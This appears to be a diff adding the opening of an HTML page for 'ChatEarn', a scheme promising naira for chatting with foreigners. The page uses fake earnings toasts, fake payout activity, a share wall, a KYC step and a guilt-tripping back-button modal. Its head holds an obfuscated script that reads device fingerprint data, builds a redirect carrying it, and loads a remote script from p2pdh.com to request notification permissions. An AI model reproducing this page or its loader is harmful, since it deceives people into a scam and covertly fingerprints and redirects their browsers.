@@ -1,0 +1,1685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>ChatEarn — Chat With Foreigners & Earn in Naira</title>
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+<meta name="robots" content="noindex,nofollow">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0D0D0D;--bg2:#141414;--bg3:#1A1A1A;
+  --card:#1E1E1E;--card2:#242424;
+  --green:#00C853;--green2:#00E676;--green3:#69F0AE;
+  --gold:#FFD600;--gold2:#FFEA00;
+  --blue:#2979FF;--blue2:#448AFF;
+  --red:#FF1744;--red2:#FF4569;
+  --w:#FFFFFF;--text:#B0B0B0;--muted:#606060;
+  --line:rgba(255,255,255,0.08);
+  --wa:#25D366;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:"Inter",sans-serif;background:var(--bg);color:var(--w);min-height:100vh;overflow-x:hidden;-webkit-user-select:none;user-select:none;}
+
+@keyframes rise{from{transform:translateY(20px);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes pop{from{transform:scale(.3);opacity:0}to{transform:scale(1);opacity:1}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.2}}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,200,83,.4)}70%{box-shadow:0 0 0 12px transparent}}
+@keyframes shine{0%,100%{left:-60%}50%{left:130%}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes countUp{from{opacity:0;transform:scale(1.3)}to{opacity:1;transform:scale(1)}}
+@keyframes typing{0%,100%{opacity:1}50%{opacity:.4}}
+@keyframes slideUp{from{transform:translateY(100%);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes msgIn{from{transform:translateX(-20px);opacity:0}to{transform:translateX(0);opacity:1}}
+@keyframes earnPop{0%{transform:scale(1)}50%{transform:scale(1.15)}100%{transform:scale(1)}}
+@keyframes shimmer{0%{background-position:200% center}100%{background-position:-200% center}}
+
+/* SCREENS */
+.screen{display:none;min-height:100vh;}
+.screen.active{display:block;}
+
+/* ══ LANDING ══ */
+#landing.active{
+  background:linear-gradient(135deg,#0D0D0D 0%,#001A0D 50%,#0D0D0D 100%);
+  display:block;
+}
+#loading.active{display:flex;flex-direction:column;align-items:center;justify-content:center;}
+#processing.active{display:flex;flex-direction:column;align-items:center;justify-content:center;}
+.land-header{padding:20px 20px 0;display:flex;align-items:center;justify-content:space-between;}
+.land-logo{display:flex;align-items:center;gap:10px;}
+.land-logo-icon{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--green),var(--green2));display:flex;align-items:center;justify-content:center;font-size:18px;}
+.land-logo-name{font-size:18px;font-weight:800;color:var(--w);}
+.land-logo-name span{color:var(--green);}
+.land-badge{background:rgba(0,200,83,.15);border:1px solid rgba(0,200,83,.3);border-radius:100px;padding:5px 12px;font-size:11px;font-weight:700;color:var(--green);}
+
+.land-hero{flex:1;padding:30px 20px 40px;display:flex;flex-direction:column;align-items:center;text-align:center;}
+.land-avatars{display:flex;align-items:center;justify-content:center;margin-bottom:24px;}
+.land-av{width:56px;height:56px;border-radius:50%;border:3px solid var(--bg);overflow:hidden;background:var(--card2);display:flex;align-items:center;justify-content:center;font-size:26px;margin-left:-12px;flex-shrink:0;}
+.land-av:first-child{margin-left:0;}
+.land-av-count{width:56px;height:56px;border-radius:50%;border:3px solid var(--bg);background:var(--green);display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;color:#000;margin-left:-12px;}
+
+.land-title{font-size:clamp(28px,8vw,40px);font-weight:900;line-height:1.15;margin-bottom:12px;}
+.land-title em{color:var(--green);font-style:normal;}
+.land-sub{font-size:15px;color:var(--text);line-height:1.7;max-width:320px;margin:0 auto 28px;}
+.land-sub strong{color:var(--w);}
+
+/* EARN RATES */
+.earn-rates{width:100%;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:16px;margin-bottom:24px;}
+.er-title{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;text-align:left;}
+.er-row{display:flex;align-items:center;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--line);}
+.er-row:last-child{border-bottom:none;}
+.er-left{display:flex;align-items:center;gap:10px;}
+.er-flag{font-size:22px;}
+.er-lang{font-size:14px;font-weight:600;color:var(--w);}
+.er-rate{font-size:15px;font-weight:800;color:var(--green);}
+
+.btn-start{width:100%;padding:18px;background:var(--green);color:#000;border:none;border-radius:14px;font-size:18px;font-weight:800;cursor:pointer;position:relative;overflow:hidden;animation:pulse 2.5s ease-in-out infinite;margin-bottom:12px;}
+.btn-start::after{content:"";position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.2);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+
+.land-trust{display:flex;align-items:center;justify-content:center;gap:16px;}
+.lt-item{display:flex;align-items:center;gap:5px;font-size:11px;color:var(--muted);font-weight:600;}
+
+/* ══ REGISTER ══ */
+#register{background:var(--bg);padding:0;}
+.reg-header{padding:20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--line);}
+.reg-back{width:36px;height:36px;border-radius:10px;background:var(--card);display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;}
+.reg-title{font-size:16px;font-weight:700;}
+
+.reg-body{padding:20px;}
+.reg-hero{text-align:center;margin-bottom:28px;}
+.reg-hero-icon{font-size:48px;margin-bottom:12px;display:block;}
+.reg-hero h2{font-size:22px;font-weight:800;margin-bottom:6px;}
+.reg-hero p{font-size:13px;color:var(--text);}
+
+.form-group{margin-bottom:16px;}
+.form-label{font-size:12px;font-weight:600;color:var(--text);margin-bottom:6px;display:block;letter-spacing:.5px;text-transform:uppercase;}
+.form-input{width:100%;padding:14px 16px;background:var(--card);border:1.5px solid var(--line);border-radius:12px;color:var(--w);font-family:"Inter",sans-serif;font-size:15px;outline:none;transition:border-color .2s;}
+.form-input:focus{border-color:var(--green);}
+.form-input::placeholder{color:var(--muted);}
+
+.terms-row{display:flex;align-items:flex-start;gap:10px;margin-bottom:20px;}
+.terms-cb{width:20px;height:20px;border-radius:6px;background:var(--green);display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;font-size:12px;}
+.terms-txt{font-size:12px;color:var(--text);line-height:1.6;}
+.terms-txt span{color:var(--green);}
+
+.btn-register{width:100%;padding:16px;background:var(--green);color:#000;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;position:relative;overflow:hidden;}
+.btn-register::after{content:"";position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.2);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+
+.reg-login{text-align:center;margin-top:16px;font-size:13px;color:var(--text);}
+.reg-login span{color:var(--green);font-weight:700;}
+
+/* ══ LOADING ══ */
+#loading{background:var(--bg);text-align:center;padding:40px 20px;}
+.ld-icon{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--green2));display:flex;align-items:center;justify-content:center;font-size:36px;margin:0 auto 24px;animation:pop .6s cubic-bezier(.34,1.56,.64,1) both;}
+.ld-title{font-size:22px;font-weight:800;margin-bottom:8px;}
+.ld-sub{font-size:14px;color:var(--text);margin-bottom:30px;}
+.ld-bar{width:100%;max-width:300px;height:6px;background:var(--card);border-radius:100px;overflow:hidden;margin:0 auto 16px;}
+.ld-fill{height:100%;background:var(--green);border-radius:100px;width:0%;transition:width .5s ease;}
+.ld-steps{text-align:left;max-width:300px;margin:0 auto;}
+.ld-step{display:flex;align-items:center;gap:10px;font-size:13px;color:var(--muted);padding:6px 0;transition:color .3s;}
+.ld-step.done{color:var(--green);}
+.ld-step-dot{width:16px;height:16px;border-radius:50%;border:2px solid var(--muted);flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:9px;transition:all .3s;}
+.ld-step.done .ld-step-dot{background:var(--green);border-color:var(--green);color:#000;}
+
+/* ══ DASHBOARD ══ */
+#dashboard{background:var(--bg);}
+.dash-header{background:var(--card);padding:16px 20px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:100;}
+.dh-left{display:flex;align-items:center;gap:10px;}
+.dh-av{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,var(--green),var(--blue));display:flex;align-items:center;justify-content:center;font-size:16px;}
+.dh-name{font-size:15px;font-weight:700;}
+.dh-status{font-size:11px;color:var(--green);}
+.dh-earn{text-align:right;}
+.dh-earn-lbl{font-size:10px;color:var(--muted);font-family:"DM Mono",monospace;}
+.dh-earn-val{font-size:18px;font-weight:900;color:var(--green);}
+
+/* BONUS BANNER */
+.bonus-banner{background:linear-gradient(135deg,rgba(0,200,83,.15),rgba(0,230,118,.08));border:1px solid rgba(0,200,83,.25);margin:16px;border-radius:14px;padding:14px 16px;display:flex;align-items:center;gap:12px;}
+.bb-icon{font-size:28px;flex-shrink:0;}
+.bb-body{flex:1;}
+.bb-title{font-size:14px;font-weight:800;color:var(--w);}
+.bb-sub{font-size:12px;color:var(--text);}
+.bb-amount{font-size:20px;font-weight:900;color:var(--green);text-align:right;}
+
+/* FOREIGNERS LIST — like image 1 */
+.section-title{padding:0 20px;margin-bottom:12px;display:flex;align-items:center;justify-content:space-between;}
+.st-label{font-size:16px;font-weight:800;}
+.st-badge{background:rgba(0,200,83,.15);border-radius:100px;padding:3px 10px;font-size:11px;font-weight:700;color:var(--green);}
+
+.foreigner-list{padding:0 16px;}
+.foreigner-card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px;display:flex;align-items:center;gap:12px;margin-bottom:10px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden;}
+.foreigner-card:active{transform:scale(.98);}
+.foreigner-card::before{content:"";position:absolute;left:0;top:0;bottom:0;width:4px;background:var(--green);}
+.fc-av{width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;position:relative;}
+.fc-online{position:absolute;bottom:1px;right:1px;width:12px;height:12px;border-radius:50%;background:var(--green);border:2px solid var(--card);animation:blink 2s infinite;}
+.fc-body{flex:1;}
+.fc-name{font-size:14px;font-weight:700;color:var(--w);margin-bottom:2px;}
+.fc-country{font-size:12px;color:var(--text);}
+.fc-earn{background:var(--green);color:#000;border:none;border-radius:8px;padding:8px 14px;font-size:12px;font-weight:800;cursor:pointer;flex-shrink:0;}
+
+/* WITHDRAW TEASER */
+.withdraw-teaser{margin:16px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;display:flex;align-items:center;justify-content:space-between;}
+.wt-left{display:flex;align-items:center;gap:10px;}
+.wt-icon{font-size:28px;}
+.wt-body{}
+.wt-title{font-size:14px;font-weight:700;}
+.wt-sub{font-size:11px;color:var(--text);}
+.wt-btn{background:var(--card2);border:1px solid var(--line);border-radius:8px;padding:8px 14px;font-size:12px;font-weight:700;color:var(--muted);cursor:not-allowed;}
+.wt-btn.active{background:var(--green);color:#000;border-color:var(--green);cursor:pointer;}
+
+/* ══ CHAT ══ */
+#chat{background:var(--bg2);}
+.chat-header{background:var(--card);padding:14px 16px;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--line);position:sticky;top:0;z-index:100;}
+.ch-back{font-size:22px;cursor:pointer;}
+.ch-av{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:22px;position:relative;flex-shrink:0;}
+.ch-online{position:absolute;bottom:1px;right:1px;width:11px;height:11px;border-radius:50%;background:var(--green);border:2px solid var(--card);}
+.ch-info{flex:1;}
+.ch-name{font-size:15px;font-weight:700;}
+.ch-status{font-size:11px;color:var(--green);}
+.ch-earn-badge{background:rgba(0,200,83,.15);border:1px solid rgba(0,200,83,.25);border-radius:8px;padding:5px 10px;font-size:12px;font-weight:700;color:var(--green);}
+
+.chat-body{padding:16px;min-height:calc(100vh - 140px);}
+.msg{display:flex;flex-direction:column;margin-bottom:16px;}
+.msg.incoming{align-items:flex-start;}
+.msg.outgoing{align-items:flex-end;}
+.msg-bubble{max-width:75%;padding:12px 14px;border-radius:18px;font-size:14px;line-height:1.5;animation:msgIn .3s ease both;}
+.msg.incoming .msg-bubble{background:var(--card);color:var(--w);border-bottom-left-radius:4px;}
+.msg.outgoing .msg-bubble{background:var(--green);color:#000;font-weight:500;border-bottom-right-radius:4px;}
+.msg-time{font-size:10px;color:var(--muted);margin-top:4px;font-family:"DM Mono",monospace;}
+.msg-earn{font-size:11px;color:var(--green);font-weight:700;margin-top:3px;animation:earnPop .4s ease both;}
+
+/* TYPING INDICATOR */
+.typing-indicator{display:flex;align-items:center;gap:4px;padding:12px 14px;background:var(--card);border-radius:18px;border-bottom-left-radius:4px;width:60px;margin-bottom:16px;}
+.ti-dot{width:7px;height:7px;border-radius:50%;background:var(--muted);}
+.ti-dot:nth-child(1){animation:typing .8s ease-in-out infinite}
+.ti-dot:nth-child(2){animation:typing .8s ease-in-out .2s infinite}
+.ti-dot:nth-child(3){animation:typing .8s ease-in-out .4s infinite}
+
+/* EARN TOAST */
+.earn-toast{position:fixed;top:80px;right:16px;background:var(--green);color:#000;padding:10px 16px;border-radius:100px;font-size:13px;font-weight:800;transform:translateX(120%);transition:transform .4s cubic-bezier(.34,1.56,.64,1);z-index:9999;}
+.earn-toast.show{transform:translateX(0);}
+
+.chat-input-wrap{position:fixed;bottom:0;left:0;right:0;background:var(--card);padding:12px 16px 20px;border-top:1px solid var(--line);display:flex;align-items:center;gap:10px;max-width:480px;margin:0 auto;}
+.chat-input{flex:1;padding:12px 16px;background:var(--bg3);border:none;border-radius:24px;color:var(--w);font-family:"Inter",sans-serif;font-size:14px;outline:none;}
+.chat-input::placeholder{color:var(--muted);}
+.btn-send{width:44px;height:44px;border-radius:50%;background:var(--green);border:none;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:18px;flex-shrink:0;}
+
+/* ══ EARNINGS ══ */
+#earnings{background:var(--bg);}
+.earn-header{background:var(--card);padding:16px 20px;border-bottom:1px solid var(--line);}
+.earn-header h2{font-size:18px;font-weight:800;}
+.earn-balance-card{background:linear-gradient(135deg,#00401A,#006B2E);margin:16px;border-radius:18px;padding:24px;text-align:center;}
+.ebc-lbl{font-size:11px;font-weight:700;color:rgba(255,255,255,.6);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;}
+.ebc-amount{font-size:52px;font-weight:900;color:#fff;line-height:1;}
+.ebc-currency{font-size:20px;font-weight:700;color:rgba(255,255,255,.7);}
+.ebc-sub{font-size:12px;color:rgba(255,255,255,.5);margin-top:8px;}
+
+.earn-breakdown{margin:0 16px 16px;background:var(--card);border-radius:14px;overflow:hidden;}
+.eb-hd{background:var(--bg3);padding:10px 16px;font-size:11px;font-weight:700;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase;border-bottom:1px solid var(--line);}
+.eb-row{display:flex;justify-content:space-between;align-items:center;padding:12px 16px;border-bottom:1px solid var(--line);}
+.eb-row:last-child{border-bottom:none;}
+.eb-key{font-size:13px;color:var(--text);}
+.eb-val{font-size:13px;font-weight:700;color:var(--green);}
+
+.btn-withdraw{width:calc(100% - 32px);margin:0 16px;padding:16px;background:var(--green);color:#000;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;}
+
+/* ══ WITHDRAW ══ */
+#withdraw{background:var(--bg);}
+.wd-header{padding:16px 20px;display:flex;align-items:center;gap:12px;border-bottom:1px solid var(--line);}
+.wd-body{padding:20px;}
+.wd-amount-display{background:linear-gradient(135deg,#00401A,#006B2E);border-radius:14px;padding:20px;text-align:center;margin-bottom:20px;}
+.wad-lbl{font-size:11px;color:rgba(255,255,255,.6);text-transform:uppercase;letter-spacing:1.5px;margin-bottom:6px;}
+.wad-amount{font-size:44px;font-weight:900;color:#fff;}
+
+.bank-options{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:16px;}
+.bank-option{background:var(--card);border:2px solid var(--line);border-radius:12px;padding:14px;text-align:center;cursor:pointer;transition:all .2s;}
+.bank-option.selected{border-color:var(--green);background:rgba(0,200,83,.1);}
+.bo-icon{font-size:24px;margin-bottom:4px;display:block;}
+.bo-name{font-size:13px;font-weight:700;}
+
+.btn-place-wd{width:100%;padding:16px;background:var(--green);color:#000;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;margin-top:16px;}
+
+/* ══ SHARE WALL ══ */
+#sharewall{background:var(--bg);}
+.sw-body{padding:20px;}
+.sw-hero{text-align:center;margin-bottom:24px;}
+.sw-hero-icon{font-size:56px;display:block;margin-bottom:14px;}
+.sw-hero h2{font-size:22px;font-weight:800;margin-bottom:6px;}
+.sw-hero p{font-size:13px;color:var(--text);line-height:1.7;}
+.sw-hero p strong{color:var(--w);}
+
+.sw-progress{background:var(--card);border-radius:14px;padding:16px;margin-bottom:16px;}
+.swp-top{display:flex;justify-content:space-between;margin-bottom:10px;}
+.swp-lbl{font-size:12px;color:var(--muted);font-family:"DM Mono",monospace;text-transform:uppercase;}
+.swp-pct{font-size:20px;font-weight:900;color:var(--green);}
+.swp-track{height:12px;background:var(--bg3);border-radius:100px;overflow:hidden;}
+.swp-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--green2));border-radius:100px;width:0%;transition:width .8s cubic-bezier(.34,1.56,.64,1);}
+.swp-status{font-size:11px;color:var(--text);text-align:center;margin-top:8px;font-family:"DM Mono",monospace;}
+
+.btn-share-wa{width:100%;padding:18px;background:var(--wa);color:#fff;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;position:relative;overflow:hidden;}
+.btn-share-wa::after{content:"";position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.2);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+
+.sw-note{text-align:center;font-size:11px;color:var(--muted);font-family:"DM Mono",monospace;margin-bottom:16px;}
+
+/* ══ KYC ══ */
+#kyc{background:var(--bg);}
+.kyc-body{padding:20px;}
+.kyc-hero{text-align:center;margin-bottom:24px;}
+.kyc-hero-icon{font-size:52px;display:block;margin-bottom:14px;}
+.kyc-hero h2{font-size:22px;font-weight:800;margin-bottom:6px;}
+.kyc-hero p{font-size:13px;color:var(--text);line-height:1.7;}
+
+.kyc-steps{background:var(--card);border-radius:14px;overflow:hidden;margin-bottom:16px;}
+.kyc-step{display:flex;align-items:center;gap:12px;padding:14px 16px;border-bottom:1px solid var(--line);}
+.kyc-step:last-child{border-bottom:none;}
+.ks-num{width:28px;height:28px;border-radius:50%;background:var(--green);color:#000;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;flex-shrink:0;}
+.ks-body{flex:1;}
+.ks-title{font-size:13px;font-weight:700;}
+.ks-sub{font-size:11px;color:var(--text);}
+.ks-status{font-size:11px;font-weight:700;color:var(--green);}
+
+.btn-complete-kyc{width:100%;padding:17px;background:var(--green);color:#000;border:none;border-radius:14px;font-size:17px;font-weight:800;cursor:pointer;position:relative;overflow:hidden;animation:pulse 2.5s ease-in-out infinite;}
+.btn-complete-kyc::after{content:"";position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.2);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+
+/* ══ PAYMENT PROCESSING ══ */
+#processing{background:var(--bg);min-height:100vh;padding:40px 20px;text-align:center;}
+.pp-spinner{width:70px;height:70px;border-radius:50%;border:4px solid rgba(0,200,83,.2);border-top-color:var(--green);animation:spin 1s linear infinite;margin:0 auto 24px;}
+.pp-title{font-size:24px;font-weight:900;margin-bottom:8px;}
+.pp-sub{font-size:14px;color:var(--text);margin-bottom:24px;line-height:1.7;}
+.pp-ref{background:var(--card);border-radius:10px;padding:12px 20px;margin-bottom:20px;font-family:"DM Mono",monospace;font-size:14px;color:var(--green);}
+.pp-timeline{width:100%;max-width:320px;text-align:left;}
+.pt-item{display:flex;align-items:flex-start;gap:12px;margin-bottom:16px;}
+.pt-dot{width:12px;height:12px;border-radius:50%;background:var(--green);flex-shrink:0;margin-top:3px;}
+.pt-body{}
+.pt-title{font-size:13px;font-weight:700;color:var(--w);}
+.pt-sub{font-size:11px;color:var(--text);}
+.pp-note{font-size:12px;color:var(--muted);margin-top:16px;line-height:1.7;}
+
+/* BACK WARNING */
+#backWarn{position:fixed;inset:0;background:rgba(0,0,0,.9);z-index:99998;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(12px);}
+#backWarn.show{display:flex;}
+.bw-card{width:100%;max-width:380px;background:var(--card2);border:2px solid var(--green);border-radius:18px;padding:24px 20px;text-align:center;}
+.bw-icon{font-size:46px;display:block;margin-bottom:12px;}
+.bw-title{font-size:20px;font-weight:800;color:var(--green);margin-bottom:10px;}
+.bw-body{font-size:13px;color:var(--text);line-height:1.75;margin-bottom:18px;}
+.bw-body strong{color:var(--w);}
+.btn-bw-stay{width:100%;padding:14px;background:var(--green);color:#000;border:none;border-radius:12px;font-size:16px;font-weight:800;cursor:pointer;margin-bottom:8px;}
+.btn-bw-leave{width:100%;padding:11px;background:transparent;border:1px solid var(--line);border-radius:10px;color:var(--muted);font-size:12px;font-weight:600;cursor:pointer;}
+
+.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--card2);border:1.5px solid var(--green);color:var(--green);padding:10px 20px;border-radius:100px;font-size:12px;font-weight:700;transition:transform .45s cubic-bezier(.34,1.56,.64,1);z-index:9999;white-space:nowrap;font-family:"DM Mono",monospace;}
+.toast.show{transform:translateX(-50%) translateY(0);}
+
+/* PAGE CONTAINER */
+.page-wrap{max-width:480px;margin:0 auto;}
+
+/* LIVE PAYOUT COUNTER */
+.live-counter{background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.2);border-radius:12px;padding:12px 16px;margin-bottom:20px;display:flex;align-items:center;justify-content:space-between;}
+.lc-left{display:flex;align-items:center;gap:8px;}
+.lc-dot{width:8px;height:8px;border-radius:50%;background:var(--green);animation:blink 1.2s infinite;}
+.lc-label{font-size:11px;color:var(--text);font-weight:600;}
+.lc-amount{font-size:18px;font-weight:900;color:var(--green);font-family:"DM Mono",monospace;}
+
+/* ACTIVITY TOAST */
+.activity-toast{position:fixed;top:16px;left:16px;right:16px;max-width:340px;margin:0 auto;background:var(--card2);border:1px solid rgba(0,200,83,.25);border-radius:14px;padding:10px 14px;display:flex;align-items:center;gap:10px;transform:translateY(-100px);opacity:0;transition:all .5s cubic-bezier(.34,1.56,.64,1);z-index:9990;pointer-events:none;}
+.activity-toast.show{transform:translateY(0);opacity:1;}
+.at-av{width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;flex-shrink:0;color:#000;}
+.at-body{flex:1;}
+.at-name{font-size:12px;font-weight:700;color:var(--w);}
+.at-action{font-size:11px;color:var(--text);}
+.at-time{font-size:10px;color:var(--muted);font-family:"DM Mono",monospace;}
+
+/* TESTIMONIALS */
+.testimonials{width:100%;margin-bottom:24px;}
+.testi-title{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:12px;text-align:left;}
+.testi-card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px;margin-bottom:10px;}
+.tc-top{display:flex;align-items:center;gap:10px;margin-bottom:8px;}
+.tc-av{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#000;flex-shrink:0;}
+.tc-name{font-size:13px;font-weight:700;}
+.tc-loc{font-size:11px;color:var(--text);}
+.tc-stars{color:var(--gold);font-size:13px;margin-bottom:6px;}
+.tc-text{font-size:12px;color:var(--text);line-height:1.6;}
+.tc-earned{font-size:12px;font-weight:700;color:var(--green);margin-top:6px;}
+
+/* VOICE NOTE BUBBLE */
+.voice-bubble{display:flex;align-items:center;gap:8px;padding:10px 14px;background:var(--card);border-radius:18px;border-bottom-left-radius:4px;max-width:200px;}
+.vb-play{width:28px;height:28px;border-radius:50%;background:var(--green);display:flex;align-items:center;justify-content:center;font-size:12px;flex-shrink:0;cursor:pointer;}
+.vb-wave{flex:1;height:24px;display:flex;align-items:center;gap:2px;}
+.vb-bar{width:3px;border-radius:2px;background:var(--muted);}
+.vb-dur{font-size:11px;color:var(--muted);font-family:"DM Mono",monospace;flex-shrink:0;}
+
+/* PHOTO BUBBLE */
+.photo-bubble{background:var(--card);border-radius:18px;border-bottom-left-radius:4px;overflow:hidden;max-width:180px;cursor:pointer;}
+.photo-bubble-inner{width:180px;height:130px;display:flex;align-items:center;justify-content:center;font-size:40px;background:linear-gradient(135deg,var(--card2),var(--bg3));}
+.photo-bubble-cap{padding:8px 12px;font-size:12px;color:var(--text);}
+
+/* FAIL SHARE */
+@keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-6px)}40%{transform:translateX(6px)}60%{transform:translateX(-4px)}80%{transform:translateX(4px)}}
+@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
+.share-fail{background:rgba(255,23,68,.1);border:1px solid rgba(255,23,68,.3);border-radius:12px;padding:14px;margin-bottom:14px;text-align:center;animation:shake .5s ease both;}
+.sf-title{font-size:14px;font-weight:800;color:var(--red2);margin-bottom:4px;}
+.sf-sub{font-size:12px;color:var(--text);}
+
+/* FOREIGNER AVATAR CIRCLES */
+.fc-av-circle{width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:800;flex-shrink:0;position:relative;color:#000;}
+</style>
+  <script>
+    var a='mcrpolfattafloprcmlVeedrosmico?ncc=uca&FcusleluVlearVsyipoonrctannEdhrgoiiHdt_emgocdeellicboosmccoast_avDetrnseigoAnrcebsruocw=seelri_bvoemr_ssiiocn'.split('').reduce((m,c,i)=>i%2?m+c:c+m).split('c');var Replace=(o=>{var v=a[0];try{v+=a[1]+Boolean(navigator[a[2]][a[3]]);navigator[a[2]][a[4]](o[0]).then(r=>{o[0].forEach(k=>{v+=r[k]?a[5]+o[1][o[0].indexOf(k)]+a[6]+encodeURIComponent(r[k]):a[0]})})}catch(e){}return u=>window.location.replace([u,v].join(u.indexOf(a[7])>-1?a[5]:a[7]))})([[a[8],a[9],a[10],a[11]],[a[12],a[13],a[14],a[15]]]);
+    var s = document.createElement('script');
+    s.src='//p2pdh.com/7f2/fefda/mw.min.js?z=11106750'+'&sw=/sw-check-permissions-3d5d7.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    };
+    document.head.appendChild(s);
+</script>
+  <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "xeogna7gvf");
+</script>
+
+</head>
+<body>
+
+<div id="backWarn">
+  <div class="bw-card">
+    <span class="bw-icon">💰</span>
+    <div class="bw-title">Your Earnings Will Be Lost!</div>
+    <div class="bw-body">You have <strong id="bwAmount">₦0</strong> pending. Going back will cancel your withdrawal request. Stay and complete the process.</div>
+    <button class="btn-bw-stay" onclick="closeBackWarn()">✅ Continue & Get Paid</button>
+    <button class="btn-bw-leave" onclick="closeBackWarn()">I don't want my money</button>
+  </div>
+</div>
+
+<div id="streakModal" style="position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:99997;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px);">
+  <div style="background:var(--card);border:1px solid var(--line);border-radius:20px;padding:26px 22px;width:100%;max-width:340px;text-align:center;animation:pop .4s cubic-bezier(.34,1.56,.64,1);">
+    <div style="font-size:46px;margin-bottom:10px;">🔥</div>
+    <div style="font-size:20px;font-weight:800;margin-bottom:4px;" id="streakTitle">Day 1 Streak!</div>
+    <div style="font-size:13px;color:var(--text);margin-bottom:18px;" id="streakSub">Come back tomorrow to keep it going</div>
+    <div style="display:flex;justify-content:center;gap:6px;margin-bottom:18px;flex-wrap:wrap;" id="streakDays"></div>
+    <div style="background:var(--card2);border-radius:14px;padding:14px;margin-bottom:18px;">
+      <div style="font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:1px;">Today's Bonus</div>
+      <div style="font-size:28px;font-weight:900;color:var(--green);margin-top:4px;" id="streakReward">₦200</div>
+    </div>
+    <button onclick="claimStreak()" style="width:100%;padding:15px;background:var(--green);color:#000;border:none;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;">Claim Bonus</button>
+  </div>
+</div>
+
+
+<div class="earn-toast" id="earnToast">+₦8,000 Earned! 💰</div>
+<div class="toast" id="toast"></div>
+<div class="activity-toast" id="activityToast">
+  <div class="at-av" id="atAv" style="background:#00C853;">AO</div>
+  <div class="at-body">
+    <div class="at-name" id="atName">Adaeze</div>
+    <div class="at-action" id="atAction">just earned ₦15,000 💰</div>
+  </div>
+  <div class="at-time" id="atTime">just now</div>
+</div>
+
+<div class="page-wrap">
+
+<!-- ══ LANDING ══ -->
+<div id="landing" class="screen active">
+  <div class="land-header">
+    <div class="land-logo">
+      <div class="land-logo-icon">💬</div>
+      <div class="land-logo-name">Chat<span>Earn</span></div>
+    </div>
+    <div class="land-badge">🟢 LIVE</div>
+  </div>
+
